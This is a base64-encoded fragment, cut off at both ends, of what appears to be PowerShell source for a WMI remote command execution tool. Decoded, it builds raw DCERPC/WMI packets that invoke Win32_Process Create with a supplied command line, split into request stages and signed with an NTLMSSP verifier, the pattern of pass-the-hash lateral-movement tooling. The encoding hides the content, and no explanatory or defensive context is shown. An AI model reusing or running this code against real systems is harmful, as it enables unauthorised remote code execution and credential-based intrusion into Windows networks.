CwweDAwLDB4ODAsMHgwMywweDA4LDB4MDAsMHgwMCwweDAwLDB4MzcsMHgwMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4NDksMHg2ZSwweDAwLDB4MDgsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MWMsMHgwMCwweDAwLDB4MDAsMHgwYSwweDAwLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDgwLDB4MDMsMHgwOCwweDAwLDB4MDAsMHgwMCwweDM3LDB4MDAsMHgwMCwweDAwLDB4NWUsMHgwMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAyLDB4MGIsMHgwMCwweDAwLDB4MDAsMHhmZiwweGZmLDB4MDEsMHgwMCwweDAwLDB4MDAsMHg5NCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHg1NywweDY5LDB4NmUsMHgzMywweDMyLDB4NDEsMHg1MCwweDQ5LDB4N2MsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDUwLDB4NzIsMHg2ZiwweDYzLDB4NjUsMHg3MywweDczLDB4MjAsMHg2MSwweDZlLDB4NjQsMHgyMCwweDU0LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg2OCwweDcyLDB4NjUsMHg2MSwweDY0LDB4MjAsMHg0NiwweDc1LDB4NmUsMHg2MywweDc0LDB4NjksMHg2ZiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NmUsMHg3MywweDdjLDB4NmMsMHg3MCwweDQzLDB4NmYsMHg2ZCwweDZkLDB4NjEsMHg2ZSwweDY0LDB4NGMsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDY5LDB4NmUsMHg2NSwweDIwLDB4MDAsMHgwMCwweDRkLDB4NjEsMHg3MCwweDcwLDB4NjksMHg2ZSwweDY3LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1MywweDc0LDB4NzIsMHg2OSwweDZlLDB4NjcsMHg3MywweDAwLDB4MDgsMHgwMCwweDAwLDB4MDAsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MjksMHgwMCwweDAwLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDBhLDB4MDAsMHgwMCwweDgwLDB4MDMsMHgwOCwweDAwLDB4MDAsMHgwMCwweDM3LDB4MDAsMHgwMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1ZSwweDAwLDB4MDAsMHgwMCwweDAyLDB4MGIsMHgwMCwweDAwLDB4MDAsMHhmZiwweGZmLDB4Y2EsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAyLDB4MDgsMHgyMCwweDAwLDB4MDAsMHg4YywweDAwLDB4MDAsMHgwMCwweDAwLDB4NDksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDQ0LDB4MDAsMHgwOCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgzNiwweDAwLDB4MDAsMHgwMCwweDBhLDB4MDAsMHgwMCwweDgwLDB4MDMsMHgwOCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4NTksMHgwMSwweDAwLDB4MDAsMHg1ZSwweDAwLDB4MDAsMHgwMCwweDAwLDB4MGIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweGZmLDB4ZmYsMHhjYSwweDAwLDB4MDAsMHgwMCwweDAyLDB4MDgsMHgyMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDhjLDB4MDAsMHgwMCwweDAwLDB4MTEsMHgwMSwweDAwLDB4MDAsMHgxMSwweDAzLDB4MDAsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4NzMsMHg3NCwweDcyLDB4NjksMHg2ZSwweDY3LDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDA4LDB4MDAsMHgwMCwweDAwLDB4MDEsMHgwMCwweDA0LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDA0LDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0MywweDc1LDB4NzIsMHg3MiwweDY1LDB4NmUsMHg3NCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NDQsMHg2OSwweDcyLDB4NjUsMHg2MywweDc0LDB4NmYsMHg3MiwweDc5LDB4MDAsMHgwMCwweDczLDB4NzQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDcyLDB4NjksMHg2ZSwweDY3LDB4MDAsMHgwOCwweDAwLDB4MDAsMHgwMCwweDAxLDB4MDAsMHgwNCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgxMSwweDAwLDB4MDAsMHgwMCwweDBhLDB4MDAsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4ODAsMHgwMywweDA4LDB4MDAsMHgwMCwweDAwLDB4ODUsMHgwMSwweDAwLDB4MDAsMHgwMCwweDQ5LDB4NmUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDgsMHgwMCwweDAwLDB4MDAsMHgwMSwweDAwLDB4MDQsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MWMsMHgwMCwweDAwLDB4MDAsMHgwYSwweDAwLDB4MDAsMHg4MCwweDAzLDB4MDgsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDg1LDB4MDEsMHgwMCwweDAwLDB4YWMsMHgwMSwweDAwLDB4MDAsMHgwMiwweDBiLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHhmZiwweGZmLDB4MDEsMHgwMCwweDAwLDB4MDAsMHhlMiwweDAxLDB4MDAsMHgwMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1NywweDY5LDB4NmUsMHgzMywweDMyLDB4NDEsMHg1MCwweDQ5LDB4N2MsMHg1MCwweDcyLDB4NmYsMHg2MywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NjUsMHg3MywweDczLDB4MjAsMHg2MSwweDZlLDB4NjQsMHgyMCwweDU0LDB4NjgsMHg3MiwweDY1LDB4NjEsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDY0LDB4MjAsMHg0NiwweDc1LDB4NmUsMHg2MywweDc0LDB4NjksMHg2ZiwweDZlLDB4NzMsMHg3YywweDQzLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg3MiwweDY1LDB4NjEsMHg3NCwweDY1LDB4NTAsMHg3MiwweDZmLDB4NjMsMHg2NSwweDczLDB4NzMsMHg3YywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NmMsMHg3MCwweDQzLDB4NzUsMHg3MiwweDcyLDB4NjUsMHg2ZSwweDc0LDB4NDQsMHg2OSwweDcyLDB4NjUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDYzLDB4NzQsMHg2ZiwweDcyLDB4NzksMHgyMCwweDAwLDB4MDAsMHg0ZCwweDYxLDB4NzAsMHg3MCwweDY5LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg2ZSwweDY3LDB4NTMsMHg3NCwweDcyLDB4NjksMHg2ZSwweDY3LDB4NzMsMHgwMCwweDA4LDB4MDAsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMSwweDAwLDB4MDQsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDI5LDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwYSwweDAwLDB4MDAsMHg4MCwweDAzLDB4MDgsMHgwMCwweDAwLDB4MDAsMHg4NSwweDAxLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4YWMsMHgwMSwweDAwLDB4MDAsMHgwMiwweDBiLDB4MDAsMHgwMCwweDAwLDB4ZmYsMHhmZiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MmIsMHgwMiwweDAwLDB4MDAsMHgwMiwweDA4LDB4MjAsMHgwMCwweDAwLDB4ZGEsMHgwMSwweDAwLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4NDksMHg0NCwweDAwLDB4MDgsMHgwMCwweDAwLDB4MDAsMHgwMSwweDAwLDB4MDQsMHgwMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MzYsMHgwMCwweDAwLDB4MDAsMHgwYSwweDAwLDB4MDAsMHg4MCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDMsMHgwOCwweDAwLDB4MDAsMHgwMCwweGJhLDB4MDIsMHgwMCwweDAwLDB4YWMsMHgwMSwweDAwLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MGIsMHgwMCwweDAwLDB4MDAsMHhmZiwweGZmLDB4MmIsMHgwMiwweDAwLDB4MDAsMHgwMiwweDA4LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgyMCwweDAwLDB4MDAsMHhkYSwweDAxLDB4MDAsMHgwMCwweDcyLDB4MDIsMHgwMCwweDAwLDB4MTEsMHgwMywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDEsMHgwMCwweDAwLDB4MDAsMHgwMCwweDczLDB4NzQsMHg3MiwweDY5LDB4NmUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDY3LDB4MDAsMHgwZCwweDAwLDB4MDAsMHgwMCwweDAyLDB4MDAsMHgwOCwweDAwLDB4MDAsMHgwMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwNCwweDAwLDB4MDAsMHgwMCwweDAwLDB4NTAsMHg3MiwweDZmLDB4NjMsMHg2NSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NzMsMHg3MywweDUzLDB4NzQsMHg2MSwweDcyLDB4NzQsMHg3NSwweDcwLDB4NDksMHg2ZSwweDY2LDB4NmYsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDcyLDB4NmQsMHg2MSwweDc0LDB4NjksMHg2ZiwweDZlLDB4MDAsMHgwMCwweDZmLDB4NjIsMHg2YSwweDY1LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg2MywweDc0LDB4MDAsMHgwZCwweDAwLDB4MDAsMHgwMCwweDAyLDB4MDAsMHgwOCwweDAwLDB4MDAsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgxMSwweDAwLDB4MDAsMHgwMCwweDBhLDB4MDAsMHgwMCwweDgwLDB4MDMsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDA4LDB4MDAsMHgwMCwweDAwLDB4ZWYsMHgwMiwweDAwLDB4MDAsMHgwMCwweDQ5LDB4NmUsMHgwMCwweDBkLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMiwweDAwLDB4MDgsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MWMsMHgwMCwweDAwLDB4MDAsMHgwYSwweDAwLDB4MDAsMHg4MCwweDAzLDB4MDgsMHgwMCwweDAwLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGVmLDB4MDIsMHgwMCwweDAwLDB4MTYsMHgwMywweDAwLDB4MDAsMHgwMiwweDBiLDB4MDAsMHgwMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhmZiwweGZmLDB4MDEsMHgwMCwweDAwLDB4MDAsMHg0YywweDAzLDB4MDAsMHgwMCwweDAwLDB4NTcsMHg0ZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NDksMHg3YywweDU3LDB4NjksMHg2ZSwweDMzLDB4MzIsMHg1ZiwweDUwLDB4NzIsMHg2ZiwweDYzLDB4NjUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDczLDB4NzMsMHg1MywweDc0LDB4NjEsMHg3MiwweDc0LDB4NzUsMHg3MCwweDAwLDB4MDAsMHg0ZCwweDYxLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg3MCwweDcwLDB4NjksMHg2ZSwweDY3LDB4NTMsMHg3NCwweDcyLDB4NjksMHg2ZSwweDY3LDB4NzMsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MGQsMHgwMCwweDAwLDB4MDAsMHgwMiwweDAwLDB4MDgsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MjksMHgwMCwweDAwLDB4MDAsMHgwYSwweDAwLDB4MDAsMHg4MCwweDAzLDB4MDgsMHgwMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweGVmLDB4MDIsMHgwMCwweDAwLDB4MTYsMHgwMywweDAwLDB4MDAsMHgwMiwweDBiLDB4MDAsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHhmZiwweGZmLDB4NjYsMHgwMywweDAwLDB4MDAsMHgwMiwweDA4LDB4MjAsMHgwMCwweDAwLDB4NDQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAzLDB4MDAsMHgwMCwweDAwLDB4NDksMHg0NCwweDAwLDB4MGQsMHgwMCwweDAwLDB4MDAsMHgwMiwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwOCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MzYsMHgwMCwweDAwLDB4MDAsMHgwYSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDgwLDB4MDMsMHgwOCwweDAwLDB4MDAsMHgwMCwweGY1LDB4MDMsMHgwMCwweDAwLDB4MTYsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAzLDB4MDAsMHgwMCwweDAwLDB4MGIsMHgwMCwweDAwLDB4MDAsMHhmZiwweGZmLDB4NjYsMHgwMywweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAyLDB4MDgsMHgyMCwweDAwLDB4MDAsMHg0NCwweDAzLDB4MDAsMHgwMCwweGFkLDB4MDMsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgxMSwweDAzLDB4MDAsMHgwMCwweDAwLDB4MDIsMHgwMCwweDAwLDB4MDAsMHgwMCwweDZmLDB4NjIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDZhLDB4NjUsMHg2MywweDc0LDB4M2EsMHg1NywweDY5LDB4NmUsMHgzMywweDMyLDB4NWYsMHg1MCwweDcyLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg2ZiwweDYzLDB4NjUsMHg3MywweDczLDB4NTMsMHg3NCwweDYxLDB4NzIsMHg3NCwweDc1LDB4NzAgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKCwweDAwICogNTAxKSArDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY29tbWFuZF9sZW5ndGggKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDNjLDB4MGUsMHgwMCwweDAwLDB4MDAsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwNCwweDAwLDB4MDAsMHgwMCwweDAxICsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjb21tYW5kX2xlbmd0aDIgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDgwLDB4MDAsMHg1ZiwweDVmLDB4NTAsMHg0MSwweDUyLDB4NDEsMHg0ZCwweDQ1LDB4NTQsMHg0NSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NTIsMHg1MywweDAwLDB4MDAgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNvbW1hbmRfYnl0ZXMgKw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDA0LDB4MDAsMHgwMiwweDAwLDB4MDAsMHgwMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkU3R1Yl9kYXRhLkxlbmd0aCAtbHQgJHJlcXVlc3Rfc3BsaXRfaW5kZXgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X2ZsYWdzID0gMHg4Mw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFdNSV9jbGllbnRfc3RhZ2VfbmV4dCA9ICdSZXN1bHQnDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9zcGxpdCA9ICR0cnVlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9zcGxpdF9zdGFnZV9maW5hbCA9IFtNYXRoXTo6Q2VpbGluZygkc3R1Yl9kYXRhLkxlbmd0aCAvICRyZXF1ZXN0X3NwbGl0X2luZGV4KQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkcmVxdWVzdF9zcGxpdF9zdGFnZSAtbHQgMikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9sZW5ndGggPSAkc3R1Yl9kYXRhLkxlbmd0aA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzdHViX2RhdGEgPSAkc3R1Yl9kYXRhWzAuLigkcmVxdWVzdF9zcGxpdF9pbmRleCAtIDEpXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X3NwbGl0X3N0YWdlID0gMg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzZXF1ZW5jZV9udW1iZXJfY291bnRlciA9IDEwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlcXVlc3RfZmxhZ3MgPSAweDgxDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlcXVlc3Rfc3BsaXRfaW5kZXhfdHJhY2tlciA9ICRyZXF1ZXN0X3NwbGl0X2luZGV4DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFdNSV9jbGllbnRfc3RhZ2VfbmV4dCA9ICdSZXF1ZXN0Jw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmKCRyZXF1ZXN0X3NwbGl0X3N0YWdlIC1lcSAkcmVxdWVzdF9zcGxpdF9zdGFnZV9maW5hbCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9zcGxpdCA9ICRmYWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzZXF1ZW5jZV9udW1iZXIgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRzZXF1ZW5jZV9udW1iZXJfY291bnRlcikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9zcGxpdF9zdGFnZSA9IDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3R1Yl9kYXRhID0gJHN0dWJfZGF0YVskcmVxdWVzdF9zcGxpdF9pbmRleF90cmFja2VyLi4kc3R1Yl9kYXRhLkxlbmd0aF0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9mbGFncyA9IDB4ODINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkV01JX2NsaWVudF9zdGFnZV9uZXh0ID0gJ1Jlc3VsdCcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9sZW5ndGggPSAkc3R1Yl9kYXRhLkxlbmd0aCAtICRyZXF1ZXN0X3NwbGl0X2luZGV4X3RyYWNrZXINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3R1Yl9kYXRhID0gJHN0dWJfZGF0YVskcmVxdWVzdF9zcGxpdF9pbmRleF90cmFja2VyLi4oJHJlcXVlc3Rfc3BsaXRfaW5kZXhfdHJhY2tlciArICRyZXF1ZXN0X3NwbGl0X2luZGV4IC0gMSldDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHJlcXVlc3Rfc3BsaXRfaW5kZXhfdHJhY2tlciArPSAkcmVxdWVzdF9zcGxpdF9pbmRleA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXF1ZXN0X3NwbGl0X3N0YWdlKysNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2VxdWVuY2VfbnVtYmVyID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkc2VxdWVuY2VfbnVtYmVyX2NvdW50ZXIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNlcXVlbmNlX251bWJlcl9jb3VudGVyKysNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVxdWVzdF9mbGFncyA9IDB4ODANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkV01JX2NsaWVudF9zdGFnZV9uZXh0ID0gJ1JlcXVlc3QnDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfUlBDID0gR2V0LVBhY2tldFJQQ1JlcXVlc3QgJHJlcXVlc3RfZmxhZ3MgJHN0dWJfZGF0YS5MZW5ndGggMTYgJHJlcXVlc3RfYXV0aF9wYWRkaW5nICRyZXF1ZXN0X2NhbGxfSUQgJHJlcXVlc3RfY29udGV4dF9JRCAkcmVxdWVzdF9vcG51bSAkcmVxdWVzdF9VVUlEDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRyZXF1ZXN0X3NwbGl0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfUlBDWyJSUENSZXF1ZXN0X0FsbG9jSGludCJdID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcmVxdWVzdF9sZW5ndGgpDQogICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTlRMTVNTUF92ZXJpZmllciA9IEdldC1QYWNrZXROVEx